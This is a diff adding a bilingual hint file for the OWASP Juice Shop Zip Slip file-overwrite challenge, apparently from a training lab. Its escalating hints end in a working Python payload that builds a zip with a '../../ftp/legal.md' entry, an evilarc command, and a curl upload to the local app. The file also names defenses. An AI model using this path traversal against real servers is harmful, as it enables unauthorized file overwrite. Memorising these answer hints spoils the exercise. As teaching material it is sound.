@@ -1,0 +1,164 @@
+challenge_key: "fileWriteChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP officiel #1 : "Look out for a tweet
+      praising new functionality of the web shop. Then find
+      a third party vulnerability associated with it". Donc
+      threat intelligence : suivre @owasp_juiceshop sur
+      Twitter et trouver une annonce sur une nouvelle
+      functionnalite + une CVE associee. Hint #2 : la
+      cible est un endpoint de file upload.
+    text_en: |
+      Official OWASP hint #1: "Look out for a tweet
+      praising new functionality of the web shop. Then find
+      a third party vulnerability associated with it". So
+      threat intelligence: follow @owasp_juiceshop on
+      Twitter and find announcement about new functionality
+      + associated CVE. Hint #2: target is a file upload
+      endpoint.
+    pedagogical_intent: |
+      Activate threat intelligence + dependency reflex.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      Endpoints de file upload dans Juice Shop : (1) /api/
+      Complaints upload (formulaire B2B accessible quand
+      logged in en role customer), (2) profile picture
+      upload. Le hint #3 : "the Juice Shop is depending on
+      a library that suffers from an arbitrary file
+      overwrite vulnerability". Donc cherche dans
+      package.json les libraries de gestion de fichiers
+      (zip, unzip, archive). La cible est un .zip uploade.
+    text_en: |
+      File upload endpoints in Juice Shop: (1) /api/
+      Complaints upload (B2B form accessible when logged
+      in as customer role), (2) profile picture upload.
+      Hint #3: "the Juice Shop is depending on a library
+      that suffers from an arbitrary file overwrite
+      vulnerability". So look in package.json for file
+      handling libraries (zip, unzip, archive). Target is
+      a .zip upload.
+    pedagogical_intent: |
+      Spell upload surface + library category.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      La library cible est `unzipper` (verifie via routes/
+      fileUpload.ts:39 : `unzipper.Parse()`). Vulnerabilite
+      = Zip Slip (Snyk research disclosure 2018,
+      snyk.io/research/zip-slip-vulnerability). Mecanique :
+      un .zip dont une entry path contient `../../target`
+      permet d'ecrire en dehors du dossier d'extraction.
+      Cible = `ftp/legal.md` (verifie ligne 43).
+    text_en: |
+      Target library is `unzipper` (verified via
+      routes/fileUpload.ts:39: `unzipper.Parse()`).
+      Vulnerability = Zip Slip (Snyk research disclosure
+      2018, snyk.io/research/zip-slip-vulnerability).
+      Mechanic: a .zip whose entry path contains
+      `../../target` allows writing outside extraction
+      folder. Target = `ftp/legal.md` (verified line 43).
+    pedagogical_intent: |
+      Reveal library + CVE class.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Crafter le payload .zip :
+      (a) Avec Python (ne pas utiliser zipfile native qui
+      sanitize automatiquement) :
+        ```python
+        import zipfile
+        with zipfile.ZipFile('exploit.zip', 'w') as z:
+          # Use writestr with explicit filename containing ../
+          info = zipfile.ZipInfo('../../ftp/legal.md')
+          z.writestr(info, 'PWNED by ZipSlip\n')
+        ```
+      (b) Avec evilarc Python tool :
+        `python evilarc.py legal.md -o unix -p ftp -f
+        exploit.zip`.
+      (c) Avec un editeur hex sur le central directory du
+      zip (manual entry path edit).
+      Le path resolution : `path.resolve('uploads/
+      complaints/' + '../../ftp/legal.md')` =
+      `path.resolve('ftp/legal.md')` = match solve check.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Craft .zip payload:
+      (a) With Python (don't use native zipfile which
+      auto-sanitizes):
+        ```python
+        import zipfile
+        with zipfile.ZipFile('exploit.zip', 'w') as z:
+          info = zipfile.ZipInfo('../../ftp/legal.md')
+          z.writestr(info, 'PWNED by ZipSlip\n')
+        ```
+      (b) With evilarc Python tool:
+        `python evilarc.py legal.md -o unix -p ftp -f
+        exploit.zip`.
+      (c) With hex editor on zip central directory
+      (manual entry path edit).
+      Path resolution: `path.resolve('uploads/
+      complaints/' + '../../ftp/legal.md')` =
+      `path.resolve('ftp/legal.md')` = match solve check.
+    pedagogical_intent: |
+      Spell payload tools + path math.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Workflow complet :
+      1. Login Juice Shop comme customer (ou register).
+      2. Crafter exploit.zip avec entry `../../ftp/
+         legal.md` contenant le content desire (ex.
+         "PWNED via Zip Slip exploit").
+      3. POST /file-upload (multipart/form-data, field
+         `file`) avec exploit.zip via Burp Repeater ou
+         curl :
+         `curl -X POST -F "file=@exploit.zip"
+         http://localhost:3000/file-upload`.
+      4. Le serveur extrait via unzipper.Parse(),
+         path.resolve('uploads/complaints/' +
+         '../../ftp/legal.md') = path.resolve('ftp/
+         legal.md') = match solve.
+      5. /ftp/legal.md est overwritten avec ton contenu.
+      6. Challenge solve auto via routes/fileUpload.ts:43.
+      Source canonique : routes/fileUpload.ts:29-50 +
+      Snyk Zip Slip research 2018 + OWASP Vulnerable
+      Dependency Management Cheat Sheet.
+      Defense canonique : (a) unzipper version >= patched,
+      (b) verifier entry.path against `..` ET startsWith(
+      extractionDir + path.sep), (c) sandbox d'extraction
+      (read-only filesystem ailleurs que dans la sandbox).
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Full workflow:
+      1. Login Juice Shop as customer (or register).
+      2. Craft exploit.zip with entry `../../ftp/
+         legal.md` containing desired content (e.g.,
+         "PWNED via Zip Slip exploit").
+      3. POST /file-upload (multipart/form-data, field
+         `file`) with exploit.zip via Burp Repeater or
+         curl:
+         `curl -X POST -F "file=@exploit.zip"
+         http://localhost:3000/file-upload`.
+      4. Server extracts via unzipper.Parse(),
+         path.resolve('uploads/complaints/' +
+         '../../ftp/legal.md') = path.resolve('ftp/
+         legal.md') = match solve.
+      5. /ftp/legal.md is overwritten with your content.
+      6. Challenge auto-solves via routes/
+         fileUpload.ts:43.
+      Canonical source: routes/fileUpload.ts:29-50 +
+      Snyk Zip Slip research 2018 + OWASP Vulnerable
+      Dependency Management Cheat Sheet.
+      Canonical defense: (a) patched unzipper version,
+      (b) verify entry.path against `..` AND startsWith(
+      extractionDir + path.sep), (c) extraction sandbox
+      (read-only filesystem outside sandbox).
+    pedagogical_intent: |
+      Quasi-solution : workflow + curl + defense.
